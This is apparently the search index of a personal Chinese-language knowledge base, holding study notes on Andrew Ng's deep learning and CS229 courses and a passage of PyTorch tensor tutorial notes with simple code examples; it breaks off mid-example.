{"config": {"lang": ["en"], "separator": "[\\s\\u200b\\-]", "pipeline": ["stemmer"]}, "docs": [{"location": "", "title": "Hello", "text": "<p> \u7ea6 193 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 1 \u5206\u949f</p> \u9875\u9762\u603b\u6570\uff1a 114 \u603b\u5b57\u6570\uff1a 92974 \u4ee3\u7801\u5757\u884c\u6570\uff1a 5359 \u672c\u7ad9 PV: \u6b21    \u672c\u7ad9 UV: \u4eba    <p>\ud83d\udcac\u8fd9\u91cc\u662f \u67d0\u5170 | EnlZhao \u7684 \u77e5\u8bc6\u5e93\uff0c\u6709\u4e00\u4e9b\u8bfe\u7a0b\u7b14\u8bb0\u6216\u8005\u5b66\u4e60\u8bb0\u5f55\uff1b</p> <p>\ud83d\udcac\u5176\u4f59\u8f83\u6742\u7684\u5185\u5bb9\uff08\u8bf8\u5982\u5b66\u4e60\u603b\u7ed3\u4e00\u7c7b\u7684\uff09\u6b22\u8fce\u5927\u5bb6\u5230\u6211\u7684 \u5f15\u5bfc\u9875 \u5bfb\u627e</p> <p>Info</p> <p>\u56e0\u4e3a\u8bb0\u6027\u4e0d\u597d\uff0c\u7b14\u8bb0\u5185\u5bb9\u6574\u7406\u8f83\u4e3a\u7e41\u7410\u3002 \u800c\u4e14\u80fd\u529b\u6709\u9650\uff0c\u5927\u5676\u9009\u62e9\u6027\u770b\u770b\u53ed~</p> <p>Attention</p> <p>\u4e0a\u4fa7\u5bfc\u822a\u6761\u4e2d\uff1a</p> <ul> <li>\\(\\lceil\\) Course \\(\\rfloor\\) \u4e2d\u662f\u4e00\u4e9b\u8bfe\u7a0b\u7b14\u8bb0</li> <li>\\(\\lceil\\) AI \\(\\rfloor\\) \u4e2d\u662f\u4e00\u4e9b\u673a\u5668\u5b66\u4e60\u3001\u6df1\u5ea6\u5b66\u4e60\u76f8\u5173\u7684\u5185\u5bb9</li> <li>\\(\\lceil\\) Triviality \\(\\rfloor\\) \u4e2d\u4e00\u4e9b\u6bd4\u8f83\u6742\u7684\u5185\u5bb9</li> <li>\\(\\lceil\\) Tools \\(\\rfloor\\) \u4e2d\u662f\u4e00\u4e9b\u5de5\u5177</li> </ul> <p>\u5173\u4e8e \\(\\lceil\\) Triviality \\(\\rfloor\\) \u548c \\(\\lceil\\) Tools \\(\\rfloor\\) \u7684\u5206\u7c7b\u6709\u4e9b\u4e71\uff0c\u540e\u7eed\u53ef\u80fd\u4e5f\u8bb8\u5927\u6982\u4f1a\u6539\u4e00\u6539</p>"}, {"location": "link/", "title": "\u53cb\u94fe (\u5e7f\u544a\u4f4d)", "text": "<p> \u7ea6 74 \u4e2a\u5b57 </p> <p>Abstract</p> <p>\u6211\u7684\u6028\u79cd\u670b\u53cb\u4eec \ud83d\ude0d</p> <p>\u6392\u5217\u65e0\u5148\u540e\uff0c\u90fd\u662f\u597d\u670b\u53cb</p>"}, {"location": "link/#_2", "title": "\ud83d\udc36", "text": "wuei-L \u5927\u732a\u8e44\u5b50-\u65af\u4e22\u5c41\u5446\u5446\u7ef4"}, {"location": "link/#blog-notebook-github", "title": "Blog || Notebook || GitHub", "text": "HowJul \ud83d\ude18 \u5c0f\u6731 \ud83d\ude18 \u859b\u603b \u4ed3\u5e93\u600e\u4e48\u7a7a\u7a7a? \ud83d\ude47 !\u82df\u5bcc\u8d35! \u5929\u624d \u6587\u5b66\u5927\u5e08\uff0c\u767e\u5ea6\u672c\u5ea6 Mr. Wang \u5730\u8d28\u5927\u4f6c\uff0c\u5728\u7ebf\u5f81\u53cb <p>To Be Continued</p>"}, {"location": "AI/", "title": "Perface", "text": "<p> \u7ea6 21 \u4e2a\u5b57 </p> <p>Abstract</p> <p>\u8bb0\u5f55\u4e00\u4e9b\u673a\u5668\u5b66\u4e60\u548c\u6df1\u5ea6\u5b66\u4e60\u4e2d\u7684\u76f8\u5173\u77e5\u8bc6</p>"}, {"location": "AI/Courses/", "title": "Some Related Courses", "text": "<p> \u7ea6 22 \u4e2a\u5b57 </p> <p>list</p> <ul> <li> deeplearning.ai</li> <li> CS229 \u2014 Machine Learning | More Math</li> <li> CS229A \u2014 Machine Learning | More Application</li> <li> CS230 \u2014 Deep Learnings</li> </ul> <p>To Be Continued</p>"}, {"location": "AI/Courses/CS229/", "title": "CS229", "text": "<p> \u7ea6 32 \u4e2a\u5b57 </p> <p>Machine Learning</p> <ul> <li>\u65af\u5766\u798f\u5927\u5b66 CS229 \u8bfe\u7a0b \u2014 2018 \u79cb\u5b63\uff08\u5434\u6069\u8fbe\u6388\u8bfe\uff09</li> <li>Course Website</li> <li>Lecture Videos - B\u7ad9</li> <li>Lecture Videos - YouTube</li> </ul> <p>To Be Continued</p>"}, {"location": "AI/Courses/DeepLearning/", "title": "Deep Learning", "text": "<p> \u7ea6 59 \u4e2a\u5b57 </p> <p>Note</p> <ul> <li>\u5434\u6069\u8fbe\u6388\u8bfe</li> <li>\u8bfe\u7a0b\u94fe\u63a5\uff1adeeplearning.ai or \u7f51\u6613\u4e2d\u82f1\u5b57\u5e55</li> </ul> List <ul> <li>\u672c\u8bfe\u7a0b\u5206\u4e3a\u4e94\u4e2a\u5b50\u8bfe\u7a0b</li> <li> Neural Networks and Deep Learning</li> <li> Improving Deep Neural Networks: Hyperparameter tuning, Regularization and Optimization</li> <li> Structuring Machine Learning Projects</li> <li> Convolutional Neural Networks</li> <li> Natural Language Processing: Building Sequence Models</li> </ul>"}, {"location": "AI/Courses/DeepLearning/introduction/", "title": "Introduction to Deep Learning", "text": "<p> \u7ea6 869 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 3 \u5206\u949f</p>"}, {"location": "AI/Courses/DeepLearning/introduction/#what-is-a-neural-network", "title": "What is a Neural Network", "text": "<ul> <li>\u4eba\u5de5\u795e\u7ecf\u7f51\u7edc\uff08artificial neural network, ANN\uff09\uff0c\u7b80\u79f0\u795e\u7ecf\u7f51\u7edc\uff08nerual network, NN\uff09\uff0c\u662f\u4e00\u79cd\u6570\u5b66\u6a21\u578b\u6216\u8ba1\u7b97\u6a21\u578b\uff0c\u7528\u4e8e\u5bf9\u51fd\u6570\u8fdb\u884c\u4f30\u8ba1\u548c\u8fd1\u4f3c</li> <li> <p>\u795e\u7ecf\u7f51\u7edc\u4e3b\u8981\u7531\u201c\u8f93\u5165\u5c42\u201d\uff0c\u201c\u9690\u85cf\u5c42\u201d\u548c\u201c\u8f93\u51fa\u5c42\u201d\u7ec4\u6210\uff0c\u5176\u4e2d\u201c\u9690\u85cf\u5c42\u201d\u53ef\u4ee5\u6709\u591a\u5c42</p> <ul> <li>\u5b9e\u9645\u4e2d\uff0c\u7f51\u7edc\u8f93\u5165\u5c42\u7684\u6bcf\u4e2a\u795e\u7ecf\u5143\u4ee3\u8868\u4e00\u4e2a\u7279\u5f81\uff0c\u8f93\u51fa\u5c42\u4e2a\u6570\u4ee3\u8868\u4e86\u5206\u7c7b\u6807\u7b7e\u7684\u4e2a\u6570</li> <li>\u9690\u85cf\u5c42\u5c42\u6570\u53ca\u9690\u85cf\u5c42\u795e\u7ecf\u5143\u662f\u7531\u4eba\u5de5\u8bbe\u5b9a</li> </ul> Example <ul> <li>\u4ee5\u9884\u6d4b\u623f\u4ef7\u4e3e\u4f8b\uff0c\u623f\u4ef7\u7684\u5f71\u54cd\u56e0\u7d20\u4e3a\u623f\u5c4b\u9762\u79ef\u3001\u623f\u95f4\u6570\u3001\u5730\u6bb5\uff08\u4ee5\u4e09\u4e2a\u4e3a\u4f8b\u5b50\uff09\u7b49\uff0c\u8fd9\u4e9b\u56e0\u7d20\u5c31\u662f\u8f93\u5165\u5c42\u7684\u795e\u7ecf\u5143</li> <li>\u8f93\u51fa\u5c42\u7684\u795e\u7ecf\u5143\u4e2a\u6570\u4e3a 1\uff0c\u4ee3\u8868\u623f\u4ef7clea</li> <li>\u5219\u8be5\u795e\u7ecf\u7f51\u7edc\u4e3a\u6700\u7b80\u5355\u7684\u4e24\u5c42\u795e\u7ecf\u7f51\u7edc</li> </ul> <p></p> </li> </ul>"}, {"location": "AI/Courses/DeepLearning/introduction/#supervised-learning-with-neural-networks", "title": "Supervised Learning with Neural Networks", "text": "Info <ul> <li>\u76ee\u524d\u673a\u5668\u5b66\u4e60\u5e38\u5206\u4e3a\u76d1\u7763\u5b66\u4e60\uff08Supervised Learning\uff09\u3001\u534a\u76d1\u7763\u5b66\u4e60\uff08Semi-supervised Learning\uff09\u3001\u65e0\u76d1\u7763\u5b66\u4e60\uff08Unsupervised Learning\uff09\u548c\u5f3a\u5316\u5b66\u4e60\uff08Reinforcement Learning\uff09<ul> <li>\u901a\u4fd7\u8bb2\uff0c\u76d1\u7763\u7684\u542b\u4e49\u5c31\u662f\u8bad\u7ec3\u6570\u636e\u96c6\u548c\u6d4b\u8bd5\u6570\u636e\u96c6\u6709\u6ca1\u6709\u6807\u7b7e</li> </ul> </li> <li>\\(\\lceil\\)Supervised Learning\\(\\rfloor\\): <ul> <li>\u6570\u636e\u96c6\u4e2d\u5305\u542b\u5305\u542b\u7279\u5f81\uff08feature\uff09\u548c\u6807\u7b7e\uff08label\uff09\uff0c\u5373\u6700\u540e\u9884\u6d4b\u7ed3\u679c\u662f\u5426\u6b63\u786e\u662f\u6709\u6807\u51c6\u7b54\u6848\u505a\u53c2\u8003\u5bf9\u6bd4\u7684</li> </ul> </li> <li>\\(\\lceil\\)Unsupervised Learning\\(\\rfloor\\): <ul> <li>\u6570\u636e\u96c6\u4e2d\u53ea\u5305\u542b\u7279\u5f81\uff0c\u6ca1\u6709\u6807\u7b7e\uff0c\u5373\u6700\u540e\u9884\u6d4b\u7ed3\u679c\u662f\u5426\u6b63\u786e\u662f\u6ca1\u6709\u6807\u51c6\u7b54\u6848\u505a\u53c2\u8003\u5bf9\u6bd4\u7684</li> </ul> </li> <li>\\(\\lceil\\)Semi-supervised Learning\\(\\rfloor\\): <ul> <li>\u6570\u636e\u96c6\u4e2d\u4e00\u90e8\u5206\u5305\u542b\u7279\u5f81\u548c\u6807\u7b7e\uff0c\u5269\u4f59\u90e8\u5206\u4e0d\u542b\u6807\u7b7e\uff0c\u4f8b\u5982\u5728\u56fe\u50cf\u8bc6\u522b\u4e2d\uff0c\u624b\u5de5\u6807\u8bb0\u51fa\u4e00\u90e8\u5206\u542b\u6709\u897f\u74dc\u7684\u56fe\u7247\uff0c\u5c06\u4e0d\u5b8c\u5168\u6807\u8bb0\u7684\u6570\u636e\u96c6\u7528\u534a\u76d1\u7763\u5b66\u4e60\u7b97\u6cd5\u8fdb\u884c\u8bad\u7ec3\uff0c\u4f7f\u6a21\u578b\u80fd\u51c6\u786e\u4ece\u4e00\u5806\u7167\u7247\u4e2d\u8bc6\u522b\u51fa\u897f\u74dc</li> <li>\u5728\u534a\u76d1\u7763\u5b66\u4e60\u4e2d\uff0c\u4e5f\u5305\u542b\u4e24\u79cd\u5b66\u4e60\u65b9\u6cd5<ol> <li>\u5c06\u6ca1\u6709\u6807\u7b7e\u548c\u6709\u6807\u7b7e\u7684\u6570\u636e\u540c\u7b49\u5bf9\u5f85\u8bad\u7ec3</li> <li>\u5c06\u6ca1\u6709\u6807\u7b7e\u7684\u6570\u636e\u4f5c\u4e3a\u9700\u8981\u88ab\u9884\u6d4b\u7684\u6570\u636e\u5bf9\u5f85</li> </ol> </li> </ul> </li> <li>\\(\\lceil\\)Reinforcement Learning\\(\\rfloor\\): <ul> <li>\u5f3a\u5316\u5b66\u4e60\u662f\u4e00\u79cd\u673a\u5668\u5b66\u4e60\u65b9\u6cd5\uff0c\u5f3a\u8c03\u5982\u4f55\u57fa\u4e8e\u73af\u5883\u800c\u884c\u52a8\uff0c\u4ee5\u53d6\u5f97\u6700\u5927\u5316\u7684\u9884\u671f\u5229\u76ca</li> <li>\u5f3a\u5316\u5b66\u4e60\u7684\u4e3b\u8981\u7279\u70b9\u662f agent \u53ef\u4ee5\u6839\u636e\u5f53\u524d\u7684\u72b6\u6001\uff0c\u9009\u62e9\u4e00\u4e2a\u52a8\u4f5c\uff0c\u7136\u540e\u73af\u5883\u4f1a\u6839\u636e\u8fd9\u4e2a\u52a8\u4f5c\u7ed9 agent \u4e00\u4e2a\u5956\u52b1\uff0cagent \u6839\u636e\u8fd9\u4e2a\u5956\u52b1\u6765\u5224\u65ad\u8fd9\u4e2a\u52a8\u4f5c\u662f\u4e0d\u662f\u4e00\u4e2a\u597d\u7684\u52a8\u4f5c\uff0c\u7136\u540e\u4e0d\u65ad\u7684\u5b66\u4e60\uff0c\u6700\u7ec8\u5b66\u5230\u4e00\u4e2a\u6700\u4f18\u7684\u7b56\u7565</li> <li>\u5f3a\u5316\u5b66\u4e60\u7684\u4e00\u4e2a\u5178\u578b\u5e94\u7528\u662f\u673a\u5668\u4eba\u7684\u81ea\u4e3b\u5bfc\u822a\uff0c\u673a\u5668\u4eba\u5728\u73af\u5883\u4e2d\u79fb\u52a8\uff0c\u6bcf\u79fb\u52a8\u4e00\u6b65\uff0c\u73af\u5883\u4f1a\u7ed9\u673a\u5668\u4eba\u4e00\u4e2a\u5956\u52b1\uff0c\u673a\u5668\u4eba\u6839\u636e\u8fd9\u4e2a\u5956\u52b1\u6765\u5224\u65ad\u8fd9\u4e2a\u52a8\u4f5c\u662f\u4e0d\u662f\u4e00\u4e2a\u597d\u7684\u52a8\u4f5c\uff0c\u7136\u540e\u4e0d\u65ad\u7684\u5b66\u4e60\uff0c\u6700\u7ec8\u5b66\u5230\u4e00\u4e2a\u6700\u4f18\u7684\u7b56\u7565</li> </ul> </li> </ul> <ul> <li> <p>\u673a\u5668\u5b66\u4e60\u4e5f\u5e38\u88ab\u7528\u4e8e\u7ed3\u6784\u5316\u6570\u636e\uff08Structured Data\uff09\u548c\u975e\u7ed3\u6784\u5316\u6570\u636e\uff08Unstructured Data\uff09\u7684\u5904\u7406</p> <ul> <li>\u7ed3\u6784\u5316\u6570\u636e\uff1a\u6570\u636e\u5e38\u4ee5\u8868\u683c\u7684\u5f62\u5f0f\u5b58\u5728\uff0c\u6bcf\u4e00\u884c\u4ee3\u8868\u4e00\u4e2a\u6837\u672c\uff0c\u6bcf\u4e00\u5217\u4ee3\u8868\u4e00\u4e2a\u7279\u5f81\u3002\u610f\u5473\u7740\u6bcf\u4e2a\u7279\u5f81\u90fd\u6709\u6e05\u6670\u7684\u5b9a\u4e49</li> <li>\u975e\u7ed3\u6784\u5316\u6570\u636e\uff1a\u6570\u636e\u4ee5\u56fe\u7247\u3001\u97f3\u9891\u3001\u89c6\u9891\u3001\u6587\u672c\u7b49\u5f62\u5f0f\u5b58\u5728\uff0c\u65e0\u6cd5\u7528\u8868\u683c\u7684\u5f62\u5f0f\u8868\u793a\u3002\u4f8b\u5982\u56fe\u50cf\u4e2d\u7684\u50cf\u7d20\u503c\u3001\u6587\u672c\u4e2d\u7684\u67d0\u4e2a\u5355\u8bcd......</li> </ul> </li> <li> <p>\u4e0b\u9762\u7684\u8bfe\u7a0b\u4e2d\uff0c\u4e3a\u66f4\u6e05\u695a\u89e3\u91ca\u7b97\u6cd5\u539f\u7406\u4f1a\u591a\u7528\u975e\u7ed3\u6784\u5316\u6570\u636e\u7684\u4f8b\u5b50</p> </li> </ul>"}, {"location": "AI/Courses/DeepLearning/course1/", "title": "Neural Networks and Deep Learning", "text": "<p> \u7ea6 23 \u4e2a\u5b57 </p> <p>List</p> <ul> <li> Basics of Nerual Network Programming</li> <li> One hidden layer Neural Network</li> <li> Deep Neural Network</li> </ul> <p>To Be Continued</p>"}, {"location": "AI/Courses/DeepLearning/course1/lec01/", "title": "Basics of Nerual Network Programming", "text": "<p> \u7ea6 441 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 1 \u5206\u949f</p>"}, {"location": "AI/Courses/DeepLearning/course1/lec01/#binary-classification", "title": "Binary Classification", "text": "<p>\u672c\u8282\u4ee5 logistic \u56de\u5f52(\u4e00\u4e2a\u7528\u4e8e\u4e8c\u5206\u5206\u7c7b\u7684\u7b97\u6cd5)\u6765\u9610\u8ff0\uff0c\u4ee5\u6c42\u66f4\u597d\u5730\u7406\u89e3</p> <p>\u6bd4\u5982\u5bf9\u4e8e\u4e00\u5f20\u56fe\u7247\u7684\u8bc6\u522b\uff0c\u8f93\u5165\u662f\u56fe\u7247\uff0c\u8f93\u51fa\u662f\u662f\u5426\u662f\u732b\uff081 \u8868\u793a\u662f\u201c\u732b\u201d\uff09</p> \u56fe\u7247\u5728\u8ba1\u7b97\u673a\u4e2d\u7684\u8868\u793a\u65b9\u6cd5 <ul> <li>\u8ba1\u7b97\u673a\u8981\u4fdd\u5b58\u4e00\u5f20\u56fe\u7247\uff0c\u8981\u4fdd\u5b58\u4e09\u4e2a\u72ec\u7acb\u77e9\u9635\uff0c\u5206\u522b\u5bf9\u5e94\u56fe\u7247\u4e2d\u7684\u7ea2\u3001\u7eff\u3001\u84dd\u4e09\u4e2a\u989c\u8272\u901a\u9053\u3002</li> <li>\u90a3\u4e48\u5982\u679c\u8f93\u5165\u56fe\u7247\u662f 64 \u2716\ufe0f 64 \u50cf\u7d20\u7684\uff0c\u90a3\u4e48\u5c31\u6709\u4e09\u4e2a 64 \u2716\ufe0f 64 \u7684\u77e9\u9635\uff0c\u77e9\u9635\u4e2d\u7684\u503c\u5206\u522b\u4ee3\u8868\u5bf9\u5e94\u989c\u8272\u7684\u4eae\u5ea6\uff08\u5373 pixel intensity value\uff09<ul> <li>\u8981\u628a\u8fd9\u4e9b\u50cf\u7d20\u4eae\u5ea6\u503c\u653e\u8fdb\u4e00\u4e2a\u7279\u5f81\u5411\u91cf\u4e2d\uff0c\u5c31\u662f\u628a\u8fd9\u4e9b\u50cf\u7d20\u503c\u5168\u90e8\u63d0\u51fa\u6765\uff0c\u653e\u8fdb\u4e00\u4e2a\u7279\u5f81\u5411\u91cf \\(x\\) \u3002\u65b9\u6cd5\u5982\u4e0b\uff1a<ul> <li>\u5b9a\u4e49\u4e00\u4e2a\u7279\u5f81\u5411\u91cf \\(x\\) \u6765\u8868\u793a\u8fd9\u5f20\u56fe\u7247\uff0c\u4f9d\u6b21\u5217\u7ea2\u3001\u7eff\u3001\u84dd\u7684\u6bcf\u4e2a\u50cf\u7d20\u503c\u5f97\u5230\u4e00\u4e2a\u5f88\u957f\u7684\u7279\u5f81\u5411\u91cf</li> <li>\u5982\u679c\u56fe\u7247\u662f 64 \u2716\ufe0f 64 \u7684\uff0c\u90a3\u4e48\u5411\u91cf \\(x\\) \u7684\u603b\u7ef4\u5ea6\u662f 64 * 64 * 3 = 12288</li> <li>\u7528 \\(n_x\\) (or \\(n\\)) = 12288 \u6765\u8868\u793a\u8f93\u5165\u7684\u7279\u5f81\u5411\u91cf\u7684\u7ef4\u5ea6</li> </ul> </li> </ul> </li> </ul> <ul> <li>\u5728\u4e8c\u5206\u5206\u7c7b\u95ee\u9898\u4e2d\uff0c\u76ee\u6807\u662f\u8bad\u7ec3\u5904\u4e00\u4e2a\u5206\u7c7b\u5668\uff08classfier\uff09\uff0c\u5b83\u4ee5\u56fe\u7247\u7684\u7279\u5f81\u5411\u91cf \\(x\\) \u4f5c\u4e3a\u8f93\u5165\uff0c\u9884\u6d4b\u8f93\u51fa\u7684\u7ed3\u679c\u6807\u7b7e \\(y\\)\uff080 or 1\uff09 </li> </ul> <p>Notation</p> <ol> <li>\u7528\u4e00\u5bf9 \\((x, ~ y)\\) \u6765\u8868\u793a\u4e00\u4e2a\u5355\u72ec\u7684\u6837\u672c<ul> <li>\\(x \\in \\mathbb{R} ^{n_x}, y \\in {0, 1}\\) ( \\(n_x\\) \u8868\u793a\u7279\u5f81\u5411\u91cf\u7684\u7ef4\u5ea6)</li> </ul> </li> <li>\\(m\\) \u4e2a\u8bad\u7ec3\u6837\u672c\uff08training example\uff09\uff1a\\({(x^{(1)}, ~ y^{1}), (x^{(2)}, ~ y^{2}), \\dots , (x^{(m)}, ~ y^{m})}\\) <ul> <li>\\((x^{(i)}, ~ y^{i})\\) \u8868\u793a\u6837\u672c i, \\(m\\) \u8868\u793a\u8bad\u7ec3\u96c6\u4e2d\u6837\u672c\u7684\u4e2a\u6570\uff0c\u6709\u65f6\u5019\u4e3a\u4e86\u66f4\u76f4\u767d\u4f7f\u7528 \\(m_{train}\\)</li> <li>\u5f53\u8bf4\u5230\u6d4b\u8bd5\u96c6\u65f6\uff0c\u5e38\u7528 \\(m_{text}\\) \u8868\u793a\u6d4b\u8bd5\u96c6\u7684\u6837\u672c\u6570</li> </ul> </li> <li></li> </ol>"}, {"location": "AI/Courses/DeepLearning/course1/lec01/#logistic-regression", "title": "Logistic Regression", "text": ""}, {"location": "AI/Courses/DeepLearning/course2/", "title": "Improving Deep Neural Networks", "text": "<p> \u7ea6 18 \u4e2a\u5b57 </p> <p>Improving Deep Neural Networks: Hyperparameter tuning, Regularization and Optimization</p> <p>List</p> <p>To Be Continued</p>"}, {"location": "AI/Courses/DeepLearning/course3/", "title": "Structuring Machine Learning Projects", "text": "<p> \u7ea6 9 \u4e2a\u5b57 </p> <p>List</p> <p>To Be Continued</p>"}, {"location": "AI/Courses/DeepLearning/course4/", "title": "Convolutional Neural Networks", "text": "<p> \u7ea6 8 \u4e2a\u5b57 </p> <p>List</p> <p>To Be Continued</p>"}, {"location": "AI/Courses/DeepLearning/course5/", "title": "Natural Language Processing", "text": "<p> \u7ea6 14 \u4e2a\u5b57 </p> <p>Natural Language Processing: Building Sequence Model</p> <p>List</p> <p>To Be Continued</p>"}, {"location": "AI/LearningCriterion/", "title": "\u5b66\u4e60\u51c6\u5219", "text": "<p> \u7ea6 3 \u4e2a\u5b57 </p> <p>To Be Continued</p>"}, {"location": "AI/OptimAlgorithm/", "title": "\u4f18\u5316\u7b97\u6cd5", "text": "<p> \u7ea6 25 \u4e2a\u5b57 </p> <p>Abstract</p> <p>\u5b66\u4e60\u4e00\u4e9b\u4f18\u5316\u7b97\u6cd5</p> <p>list</p> <p>\u524d\u7f6e\u77e5\u8bc6\uff1a\u51f8\u4f18\u5316</p> <p>To Be Continued</p>"}, {"location": "AI/PyTorch/", "title": "PyTorch", "text": "<p> \u7ea6 74 \u4e2a\u5b57 </p> <ul> <li>PyTorch \u662f\u4e00\u4e2a\u57fa\u4e8e Torch \u5e93\u7684\u673a\u5668\u5b66\u4e60\u6846\u67b6</li> <li>\u5c3d\u7ba1 Python \u754c\u9762\u66f4\u7cbe\u7f8e\u4e14\u662f\u5f00\u53d1\u7684\u9996\u8981\u91cd\u70b9\uff0c\u4f46 PyTorch \u4e5f\u6709\u4e00\u4e2a C++ \u63a5\u53e3</li> </ul> <p>Abstract</p> <p>PyTorch \u63d0\u4f9b\u4e24\u4e2a\u9ad8\u7ea7\u529f\u80fd\uff1a</p> <ul> <li>Tensor computing (like NumPy) with strong acceleration via graphics processing units (GPU)</li> <li>Deep neural networks built on a tape-based automatic differentiation system</li> </ul>"}, {"location": "AI/PyTorch/BLITZ/", "title": "DEEP LEARNING WITH PYTORCH: A 60 MINUTE BLITZ", "text": "<p> \u7ea6 46 \u4e2a\u5b57 </p> <p>Goal of this tutorial:</p> <ul> <li>Understand PyTorch\u2019s Tensor library and neural networks at a high level.</li> <li>Train a small neural network to classify images</li> </ul> <p>List</p> <ul> <li> Tensors</li> <li> A Gentle Introduction to torch.autograd</li> <li> Neural Networks</li> <li> Training a Classifier</li> </ul>"}, {"location": "AI/PyTorch/BLITZ/lec01/", "title": "Tensors \uff5c \u5f20\u91cf", "text": "<p> \u7ea6 498 \u4e2a\u5b57  120 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 3 \u5206\u949f</p> <ul> <li>Tensors \u662f\u7c7b\u4f3c arrays \u548c matrices \u7684\u6570\u636e\u7ed3\u6784 (\u5728 Pytorch \u4e2d\u4f7f\u7528 tensors \u6765\u7f16\u7801\u6a21\u578b\u7684\u8f93\u5165\u548c\u8f93\u51fa\uff0c\u4ee5\u53ca\u6a21\u578b\u7684\u53c2\u6570)</li> <li>Tensors \u7c7b\u4f3c\u4e8e Numpy \u7684 ndarrays\uff0c\u4f46\u662f\u53ef\u4ee5\u5728 GPU \u6216\u5176\u4ed6\u7279\u6b8a\u786c\u4ef6\u4e0a\u4f7f\u7528\u6765\u52a0\u901f\u8ba1\u7b97</li> </ul> <pre><code>import torch\nimport numpy as np\n</code></pre>"}, {"location": "AI/PyTorch/BLITZ/lec01/#tensor-initialization", "title": "Tensor Initialization", "text": "<ul> <li>Tensor \u53ef\u4ee5\u901a\u8fc7\u591a\u79cd\u65b9\u5f0f\u8fdb\u884c\u521d\u59cb\u5316</li> </ul>"}, {"location": "AI/PyTorch/BLITZ/lec01/#directly-from-data", "title": "Directly from data", "text": "<ul> <li>Tensor \u53ef\u4ee5\u76f4\u63a5\u4ece data \u4e2d\u8fdb\u884c\u521d\u59cb\u5316 (\u6570\u636e\u7c7b\u578b\u4f1a\u81ea\u52a8\u63a8\u65ad)</li> </ul> <pre><code>data = [[1, 2], [3, 4]]\nx_data = torch.tensor(data)\n</code></pre>"}, {"location": "AI/PyTorch/BLITZ/lec01/#from-a-numpy-array", "title": "From a NumPy array", "text": "<ul> <li>Tensor \u53ef\u4ee5\u4ece NumPy array \u4e2d\u8fdb\u884c\u521d\u59cb\u5316\uff0c\u5e76\u4e14\u4fdd\u7559 NumPy array \u7684\u7ef4\u5ea6\u548c\u6570\u636e\u7c7b\u578b (\u53cd\u4e4b\u4ea6\u7136, see Bridge with NumPy</li> </ul> <pre><code>np_array = np.array(data)\nx_np = torch.from_numpy(np_array)\n</code></pre>"}, {"location": "AI/PyTorch/BLITZ/lec01/#from-another-tensor", "title": "From another tensor", "text": "<ul> <li>\u65b0\u7684 tensor \u4fdd\u7559\u4e86\u539f\u59cb tensor \u7684\u5c5e\u6027 (shape, datatype)\uff0c\u9664\u975e\u88ab\u663e\u5f0f\u5730\u91cd\u5199</li> </ul> codeoutput <pre><code>x_ones = torch.ones_like(x_data) # retains the properties of x_data\nprint(f\"Ones Tensor: \\n {x_ones} \\n\")\n\nx_rand = torch.rand_like(x_data, dtype=torch.float) # overrides the datatype of x_data\nprint(f\"Random Tensor: \\n {x_rand} \\n\")\n</code></pre> <pre><code>Ones Tensor: \n tensor([[1, 1],\n        [1, 1]])\n\nRandom Tensor:\n tensor([[0.7576, 0.2793],\n        [0.4031, 0.7347]])\n</code></pre>"}, {"location": "AI/PyTorch/BLITZ/lec01/#with-random-or-constant-values", "title": "With random or constant values", "text": "<ul> <li><code>shape</code> \u662f tensor \u7ef4\u5ea6\u7684\u5143\u7ec4(tuple), \u4e0a\u9762\u7684\u51fd\u6570\u4e2d\uff0c\u5b83\u786e\u5b9a\u4e86\u8f93\u51fa\u5f20\u91cf\u7684\u7ef4\u5ea6</li> </ul> codeoutput <pre><code>shape = (2, 3,) # tuple of tensor dimensions\nrand_tensor = torch.rand(shape)\nones_tensor = torch.ones(shape)\nzeros_tensor = torch.zeros(shape)\n\nprint(f\"Random Tensor: \\n {rand_tensor} \\n\")\nprint(f\"Ones Tensor: \\n {ones_tensor} \\n\")\nprint(f\"Zeros Tensor: \\n {zeros_tensor}\")\n</code></pre> <p>``` output Random Tensor: tensor([[0.3904, 0.6009, 0.2566],         [0.7936, 0.9408, 0.1332]])</p> <p>Ones Tensor: tensor([[1., 1., 1.],         [1., 1., 1.]])</p> <p>Zeros Tensor: tensor([[0., 0., 0.],         [0., 0., 0.]])</p>"}, {"location": "AI/PyTorch/BLITZ/lec01/#tensor-attributes", "title": "Tensor Attributes", "text": "<ul> <li>Tensor attributrs describe their shape, datatype, and the device on which they are stored</li> </ul> codeoutput <pre><code>tensor = torch.rand(3, 4)\n\nprint(f\"Shape of tensor: {tensor.shape}\")\nprint(f\"Datatype of tensor: {tensor.dtype}\")\nprint(f\"Device tensor is stored on: {tensor.device}\")\n</code></pre> <pre><code>Shape of tensor: torch.Size([3, 4])\nDatatype of tensor: torch.float32\nDevice tensor is stored on: cpu\n</code></pre>"}, {"location": "AI/PyTorch/BLITZ/lec01/#tensor-operations", "title": "Tensor Operations", "text": "<ul> <li>Over 100 tensor operations, including transposing, indexing, slicing, mathematical operations, linear algebra, random sampling, and more are comprehensively described here.</li> <li>\u8fd9\u4e9b\u64cd\u4f5c\u90fd\u80fd\u5728 GPU \u4e0a\u8fd0\u884c\uff08\u901a\u5e38\u6bd4\u5728 CPU \u4e0a\u8fd0\u884c\u901f\u5ea6\u66f4\u5feb\uff09</li> </ul> codeoutput <pre><code># We move our tensor to the GPU if available\nif torch.cuda.is_available():\n    tensor = tensor.to('cuda')\n    print(f\"Device tensor is stored on: {tensor.device}\")\n</code></pre> <pre><code>Device tensor is stored on: cuda:0\n</code></pre>"}, {"location": "AI/PyTorch/BLITZ/lec01/#some-operations", "title": "Some operations", "text": "<p>If you\u2019re familiar with the NumPy API, you\u2019ll find the Tensor API a breeze to use.</p>"}, {"location": "AI/PyTorch/BLITZ/lec01/#standard-numpy-like-indexing-and-slicing", "title": "Standard numpy-like indexing and slicing", "text": "codeoutput <pre><code>tensor = torch.ones(4, 4)\ntensor[:,1] = 0\nprint(tensor)\n</code></pre> <pre><code>tensor([[1., 0., 1., 1.],\n        [1., 0., 1., 1.],\n        [1., 0., 1., 1.],\n        [1., 0., 1., 1.]])\n</code></pre>"}, {"location": "AI/PyTorch/BLITZ/lec01/#joining-tensors", "title": "Joining tensors", "text": "<ul> <li>We can use <code>torch.cat</code> to concatenate a sequence of tensors along a given dimension. </li> </ul> <ul> <li>See also torch.stack and torch.split</li> <li>another tensor joining op that is subtly different from <code>torch.cat</code>.</li> </ul> codeoutput <pre><code>t1 = 